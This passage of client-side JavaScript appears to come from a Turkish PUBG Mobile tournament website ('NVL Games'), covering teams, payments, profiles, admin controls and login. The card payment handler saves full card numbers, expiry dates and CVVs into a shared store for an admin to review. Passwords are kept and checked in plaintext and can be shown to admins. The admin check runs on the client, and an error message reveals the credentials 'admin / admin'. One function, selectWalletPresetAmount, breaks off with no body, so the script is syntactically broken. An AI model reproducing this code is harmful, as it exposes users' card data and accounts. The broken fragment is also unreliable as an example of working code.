      nick: String(fd.get(`sub_nick_${i}`) || '').trim(),
      pubgId: String(fd.get(`sub_id_${i}`) || '').trim()
    }));
  });
  teamIdWarningActive = false;
  showToast('Kadro PUBG Mobile ID listesi kaydedildi!');
}

async function joinExistingTeam(e) {
  e.preventDefault();
  const u = getCurrentUser();
  if (!u) return;
  if (u.canCreateTournament || u.isAdmin) {
    showToast('Organizatör yetkisine sahip hesaplar takıma katılamaz.');
    return;
  }
  const code = String(new FormData(e.target).get('inviteCode') || '').trim().toUpperCase();
  let ok = false;
  await saveState(draft => {
    const tm = draft.teams.find(x => x.inviteCode === code);
    if (tm && (tm.mainPlayers || []).length < 6 && !tm.mainPlayers.includes(u.username)) {
      tm.mainPlayers.push(u.username);
      ok = true;
    }
  });
  showToast(ok ? 'Takıma katıldınız!' : 'Geçersiz davet kodu veya kadro dolu.');
}

async function removeTeamMember(teamId, member) {
  await saveState(draft => {
    const tm = draft.teams.find(x => x.id === teamId);
    if (tm) tm.mainPlayers = (tm.mainPlayers || []).filter(m => m !== member);
  });
  showToast('Oyuncu kadrodan çıkarıldı.');
}

async function disbandTeam(teamId) {
  await saveState(draft => {
    draft.teams = draft.teams.filter(x => x.id !== teamId);
  });
  showToast('Takım silindi.');
}

async function sendTeamChatMsg(e, teamId) {
  e.preventDefault();
  const u = getCurrentUser();
  const inp = document.getElementById('teamMsgInp');
  const txt = String(inp?.value || '').trim();
  if (!u || !txt) return;
  inp.value = '';
  await saveState(draft => {
    draft.teamChats[teamId] = draft.teamChats[teamId] || [];
    draft.teamChats[teamId].push({
      author: u.username,
      text: txt,
      time: new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' })
    });
  });
}

async function toggleFollow(targetUsername) {
  const me = getCurrentUser();
  if (!me || me.username === targetUsername) return;
  await saveState(draft => {
    const uMe = draft.users.find(x => x.username === me.username);
    const uTarget = draft.users.find(x => x.username === targetUsername);
    if (!uMe || !uTarget) return;
    uMe.following = Array.isArray(uMe.following) ? uMe.following : [];
    uTarget.followers = Array.isArray(uTarget.followers) ? uTarget.followers : [];
    if (uMe.following.includes(targetUsername)) {
      uMe.following = uMe.following.filter(x => x !== targetUsername);
      uTarget.followers = uTarget.followers.filter(x => x !== me.username);
    } else {
      uMe.following.push(targetUsername);
      uTarget.followers.push(me.username);
      pushSystemMessage(draft, targetUsername, `@${me.username} seni takip etmeye başladı.`);
    }
  });
}

function selectWalletPresetAmount(amt) {

function formatCardNumberInput(inp) {
  const digits = inp.value.replace(/\D/g, '').slice(0, 16);
  inp.value = digits.replace(/(\d{4})(?=\d)/g, '$1 ');
}

function formatExpiryInput(inp) {
  const digits = inp.value.replace(/\D/g, '').slice(0, 4);
  inp.value = digits.length > 2 ? digits.slice(0, 2) + '/' + digits.slice(2) : digits;
}

async function submitCreditCardPayment(e) {
  e.preventDefault();
  const u = getCurrentUser();
  if (!u) return;
  const fd = new FormData(e.target);
  const amount = Math.max(10, Number(fd.get('amount') || 100));
  const cardHolder = String(fd.get('cardHolder') || '').trim();
  const cardNumber = String(fd.get('cardNumber') || '').trim();
  const cardExpiry = String(fd.get('cardExpiry') || '').trim();
  const cardCvv = String(fd.get('cardCvv') || '').trim();

  walletDraft = { cardHolder: '', cardNumber: '', cardExpiry: '', cardCvv: '', senderName: walletDraft.senderName };

  await saveState(draft => {
    draft.payments = draft.payments || [];
    draft.payments.unshift({
      id: 'pay_' + Date.now(),
      method: 'card',
      userId: u.id,
      username: u.username,
      amount,
      cardHolder,
      cardNumber,
      cardExpiry,
      cardCvv,
      status: 'pending',
      createdAt: new Date().toLocaleString('tr-TR')
    });
    pushSystemMessage(draft, u.username, `${amount} N tutarındaki kredi kartı ödemeniz alındı ve yönetici onayına iletildi.`);
  });
  showToast('Kart ödemesi kaydedildi ve Admin Paneline iletildi!');
}

async function submitIbanDeposit(e) {
  e.preventDefault();
  const u = getCurrentUser();
  if (!u) return;
  const fd = new FormData(e.target);
  const amount = Math.max(10, Number(fd.get('amount') || 100));
  const senderName = String(fd.get('senderName') || '').trim();

  walletDraft.senderName = '';

  await saveState(draft => {
    draft.payments = draft.payments || [];
    draft.payments.unshift({
      id: 'pay_' + Date.now(),
      method: 'iban',
      userId: u.id,
      username: u.username,
      amount,
      senderName,
      status: 'pending',
      createdAt: new Date().toLocaleString('tr-TR')
    });
    pushSystemMessage(draft, u.username, `${amount} N tutarındaki havale bildiriminiz alındı ve yönetici onayına iletildi.`);
  });
  showToast('Havale bildirimi gönderildi!');
}

function uploadProfileImage(e, field) {
  const file = e.target.files?.[0];
  const u = getCurrentUser();
  if (!file || !u) return;
  const reader = new FileReader();
  reader.onload = async () => {
    await saveState(draft => {
      const target = draft.users.find(x => x.username === u.username);
      if (target) target[field] = String(reader.result || '');
    });
    showToast(field === 'avatarUrl' ? 'Profil resmi güncellendi!' : 'Banner resmi güncellendi!');
  };
  reader.readAsDataURL(file);
}

async function saveUserProfileSettings(e) {
  e.preventDefault();
  const u = getCurrentUser();
  if (!u) return;
  const fd = new FormData(e.target);
  await saveState(draft => {
    const target = draft.users.find(x => x.username === u.username);
    if (!target) return;
    target.avatarUrl = String(fd.get('avatarUrl') || '').trim();
    target.bannerUrl = String(fd.get('bannerUrl') || '').trim();
    target.name = String(fd.get('name') || target.username).trim();
    target.role = String(fd.get('role') || 'Entry Fragger').trim();
    target.pubgName = String(fd.get('pubgName') || '').trim();
    target.pubgId = String(fd.get('pubgId') || '').trim();
    target.instagram = String(fd.get('instagram') || '').trim();
    target.tiktok = String(fd.get('tiktok') || '').trim();
    target.bio = String(fd.get('bio') || '').trim();
  });
  showToast('Profil ayarları kaydedildi!');
}

async function changeOwnAccountPassword(e) {
  e.preventDefault();
  const u = getCurrentUser();
  if (!u) return;
  const fd = new FormData(e.target);
  const cur = String(fd.get('currentPassword') || '');
  const nxt = String(fd.get('newPassword') || '').trim();
  if (cur !== u.password) {
    showToast('Mevcut şifreniz hatalı.');
    return;
  }
  await saveState(draft => {
    const target = draft.users.find(x => x.username === u.username);
    if (target) target.password = nxt;
  });
  e.target.reset();
  showToast('Hesap şifreniz güncellendi!');
}

function submitAdminUnlock(e) {
  e.preventDefault();
  const fd = new FormData(e.target);
  const u = String(fd.get('adminUser') || '').trim();
  const p = String(fd.get('adminPass') || '');
  if (u === ADMIN_LOGIN_ID && p === ADMIN_LOGIN_PASS) {
    session.adminUnlocked = true;
    persistSession();
    renderApp(false);
    showToast('Admin paneline giriş yapıldı.');
  } else {
    showToast('Hatalı yönetici bilgileri. (admin / admin)');
  }
}

function toggleAdminPwd(username) {
  if (visibleAdminPasswords.has(username)) visibleAdminPasswords.delete(username);
  else visibleAdminPasswords.add(username);
  renderApp(false);
}

function promptUpdateUserPassword(username) {
  openModal(`
    <div class="flex items-center justify-between mb-3">
      <h3 class="font-black text-base">@${escapeHtml(username)} — Yeni Şifre</h3>
      <button onclick="closeModal()" class="w-8 h-8 rounded-lg theme-elevated font-bold">✕</button>
    </div>
    <form onsubmit="applyUserPasswordChange(event, '${escapeAttr(username)}')" class="space-y-3 text-xs">
      <input name="newPassword" class="theme-input w-full rounded-xl px-3.5 py-2.5" placeholder="Yeni şifreyi girin" required>
      <button type="submit" class="btn-accent w-full py-2.5 rounded-xl">Şifreyi Güncelle</button>
    </form>
  `);
}

async function applyUserPasswordChange(e, username) {
  e.preventDefault();
  const newPass = String(new FormData(e.target).get('newPassword') || '').trim();
  if (!newPass) return;
  await saveState(draft => {
    const usr = draft.users.find(u => u.username === username);
    if (usr) usr.password = newPass;
  });
  closeModal();
  showToast('Kullanıcı şifresi güncellendi.');
}

async function adminAddBalance(username, amount) {
  await saveState(draft => {
    const usr = draft.users.find(u => u.username === username);
    if (usr) {
      usr.balance = Number(usr.balance || 0) + amount;
      pushSystemMessage(draft, username, `Hesabınıza yönetici tarafından +${amount} N eklendi.`);
    }
  });
  showToast(`@${username} hesabına +${amount} N eklendi.`);
}

async function adminToggleOrg(username) {
  await saveState(draft => {
    const usr = draft.users.find(u => u.username === username);
    if (!usr) return;
    usr.canCreateTournament = !usr.canCreateTournament;
    // Yetki ALINIYORSA: bu kullanicinin tamamlanmamis (acik) turnuvalarini sil
    if (!usr.canCreateTournament && !usr.isAdmin) {
      draft.tournaments = (draft.tournaments || []).filter(
        tr => !(tr.creator === username && tr.status !== 'completed')
      );
    }
  });
  showToast('Organizatör yetkisi güncellendi.');
}

async function adminDeleteUser(username) {
  await saveState(draft => {
    draft.users = draft.users.filter(u => u.username !== username);
  });
  showToast('Kullanıcı silindi.');
}

async function approvePaymentRecord(payId) {
  await saveState(draft => {
    const p = (draft.payments || []).find(x => x.id === payId);
    if (!p || p.status !== 'pending') return;
    p.status = 'approved';
    const usr = draft.users.find(u => u.username === p.username);
    if (usr) {
      usr.balance = Number(usr.balance || 0) + Number(p.amount || 0);
      pushSystemMessage(draft, usr.username, `${p.amount} N tutarındaki ödemeniz onaylandı ve bakiyenize eklendi!`);
    }
  });
  showToast('Ödeme onaylandı ve N bakiyesi tanımlandı.');
}

async function rejectPaymentRecord(payId) {
  await saveState(draft => {
    const p = (draft.payments || []).find(x => x.id === payId);
    if (p && p.status === 'pending') p.status = 'rejected';
  });
  showToast('Ödeme talebi reddedildi.');
}

async function deletePaymentRecord(payId) {
  await saveState(draft => {
    draft.payments = (draft.payments || []).filter(x => x.id !== payId);
  });
  showToast('Ödeme kaydı silindi.');
}

async function saveAdminIbanSettings(e) {
  e.preventDefault();
  const fd = new FormData(e.target);
  await saveState(draft => {
    draft.ibanSettings = {
      bankName: String(fd.get('bankName') || '').trim(),
      iban: String(fd.get('iban') || '').trim(),
      holderName: String(fd.get('holderName') || '').trim()
    };
  });
  showToast('IBAN bilgileri güncellendi.');
}

function uploadSiteBrandFile(e, field) {
  const file = e.target.files?.[0];
  if (!file) return;
  const reader = new FileReader();
  reader.onload = async () => {
    await saveState(draft => { draft[field] = String(reader.result || ''); });
    showToast('Görsel yüklendi!');
  };
  reader.readAsDataURL(file);
}

async function saveSiteBrandUrl(e, field) {
  e.preventDefault();
  const url = String(new FormData(e.target).get('url') || '').trim() || DEFAULT_LOGO_DATA_URL;
  await saveState(draft => { draft[field] = url; });
  showToast('Görsel URL kaydedildi!');
}

async function adminCreateAnnouncement(e) {
  e.preventDefault();
  const fd = new FormData(e.target);
  await saveState(draft => {
    draft.announcements.unshift({
      id: 'ann_' + Date.now(),
      title: String(fd.get('title') || '').trim(),
      content: String(fd.get('content') || '').trim(),
      date: new Date().toLocaleDateString('tr-TR')
    });
  });
  e.target.reset();
  showToast('Duyuru yayınlandı!');
}

async function deleteAnnouncementItem(annId) {
  await saveState(draft => {
    draft.announcements = draft.announcements.filter(a => a.id !== annId);
  });
  showToast('Duyuru silindi.');
}

async function adminDeleteTournament(tourId) {
  await saveState(draft => {
    draft.tournaments = draft.tournaments.filter(t => t.id !== tourId);
  });
  showToast('Turnuva silindi.');
}

/* ============================================================================
   17. AUTH MODAL & GENERIC MODAL HELPERS
   ============================================================================ */
function openAuthModal(mode = 'login') {
  const isReg = mode === 'register';
  openModal(`
    <div class="flex items-center justify-between mb-4">
      <h2 class="text-lg font-black">${isReg ? 'NVL Games — Kayıt Ol' : 'NVL Games — Giriş Yap'}</h2>
      <button onclick="closeModal()" class="w-8 h-8 rounded-lg theme-elevated font-bold">✕</button>
    </div>
    <div class="flex gap-2 mb-4">
      <button onclick="openAuthModal('login')" class="flex-1 py-2 rounded-xl text-xs font-extrabold ${!isReg ? 'btn-accent' : 'theme-elevated'}">Giriş Yap</button>
      <button onclick="openAuthModal('register')" class="flex-1 py-2 rounded-xl text-xs font-extrabold ${isReg ? 'btn-accent' : 'theme-elevated'}">Kayıt Ol</button>
    </div>
    ${isReg ? `
      <form onsubmit="handleRegister(event)" class="space-y-3 text-xs">
        <div><label class="block font-bold muted-text mb-1">Kullanıcı Adı</label><input name="username" class="theme-input w-full rounded-xl px-3.5 py-2.5" required placeholder="kullaniciadi"></div>
        <div><label class="block font-bold muted-text mb-1">E-posta</label><input name="email" type="email" class="theme-input w-full rounded-xl px-3.5 py-2.5" required placeholder="ornek@nvlgames.com.tr"></div>
        <div><label class="block font-bold muted-text mb-1">Şifre</label><input name="password" type="password" minlength="4" class="theme-input w-full rounded-xl px-3.5 py-2.5" required></div>
        <div class="grid grid-cols-2 gap-3">
          <div><label class="block font-bold muted-text mb-1">PUBG Nick</label><input name="pubgName" class="theme-input w-full rounded-xl px-3.5 py-2.5" required></div>
          <div><label class="block font-bold muted-text mb-1">PUBG ID</label><input name="pubgId" class="theme-input w-full rounded-xl px-3.5 py-2.5" required></div>
        </div>
        <button type="submit" class="btn-accent w-full py-3 rounded-xl">Hesap Oluştur</button>
      </form>
    ` : `
      <form onsubmit="handleLogin(event)" class="space-y-3 text-xs">
        <div><label class="block font-bold muted-text mb-1">Kullanıcı Adı veya E-posta</label><input name="identifier" class="theme-input w-full rounded-xl px-3.5 py-2.5" required></div>
        <div><label class="block font-bold muted-text mb-1">Şifre</label><input name="password" type="password" class="theme-input w-full rounded-xl px-3.5 py-2.5" required></div>
        <button type="submit" class="btn-accent w-full py-3 rounded-xl">Giriş Yap</button>
      </form>
    `}
  `);
}

async function handleRegister(e) {
  e.preventDefault();
  const fd = new FormData(e.target);
  const username = String(fd.get('username') || '').trim().replace(/^@+/, '').toLowerCase();
  const email = String(fd.get('email') || '').trim().toLowerCase();
  const password = String(fd.get('password') || '');
  if (!username || username === ADMIN_LOGIN_ID) return;
  if (appData.users.some(u => u.username === username || u.email === email)) {
    showToast('Bu kullanıcı adı veya e-posta zaten kayıtlı.');
    return;
  }

  const newUser = {
    id: 'u_' + Date.now(),
    name: username,
    username,
    email,
    password,
    pubgName: String(fd.get('pubgName') || '').trim(),
    pubgId: String(fd.get('pubgId') || '').trim(),
    role: 'Entry Fragger',
    bio: '',
    avatarUrl: '',
    bannerUrl: '',
    instagram: '',
    tiktok: '',
    followers: [],
    following: [],
    balance: 0,
    canCreateTournament: false,
    isAdmin: false
  };

  session.currentUsername = username;
  persistSession();

  await saveState(draft => {
    draft.users.push(newUser);
    pushSystemMessage(draft, username, 'NVL Games hesabınız başarıyla oluşturuldu!');
  });
  closeModal();
  showToast(`Hoş geldin @${username}!`);
}

function handleLogin(e) {
  e.preventDefault();
  const fd = new FormData(e.target);
  const idVal = String(fd.get('identifier') || '').trim().replace(/^@+/, '').toLowerCase();
  const passVal = String(fd.get('password') || '');

  const found = appData.users.find(u => (u.username === idVal || u.email === idVal) && u.password === passVal);
  if (!found) {
    showToast('Kullanıcı adı veya şifre hatalı.');
    return;
  }
  session.currentUsername = found.username;
  if (found.isAdmin) session.adminUnlocked = true;
  persistSession();
  closeModal();
  renderApp(false);
  showToast(`Hoş geldin @${found.username}`);
}

function logoutUser() {
  session.currentUsername = null;
  session.adminUnlocked = false;
  isDmPanelOpen = false;
  persistSession();
  navigate('home');
}

function openAnnouncementModal(id) {
  const a = appData.announcements.find(x => x.id === id);
  if (!a) return;
  openModal(`
    <div class="flex items-center justify-between mb-3">
      <h3 class="font-black text-base">${escapeHtml(a.title)}</h3>
      <button onclick="closeModal()" class="w-8 h-8 rounded-lg theme-elevated font-bold">✕</button>
    </div>
    <p class="text-xs muted-text whitespace-pre-line leading-relaxed">${escapeHtml(a.content)}</p>
  `);
}

function openModal(html) {
  const b = document.getElementById('modalBackdrop');
  const box = document.getElementById('modalBox');
  if (!b || !box) return;
  box.innerHTML = html;
  b.classList.remove('hidden');
  b.classList.add('flex');
}

function closeModal() {
  const b = document.getElementById('modalBackdrop');
  if (!b) return;
  b.classList.add('hidden');
  b.classList.remove('flex');
}

document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') {
    closeModal();
    toggleDrawer(false);
    toggleDmPanel(false);
  }
});

// Boot Application
checkRouteFromLocation();
renderApp(false);
pullRemoteState();
</script>
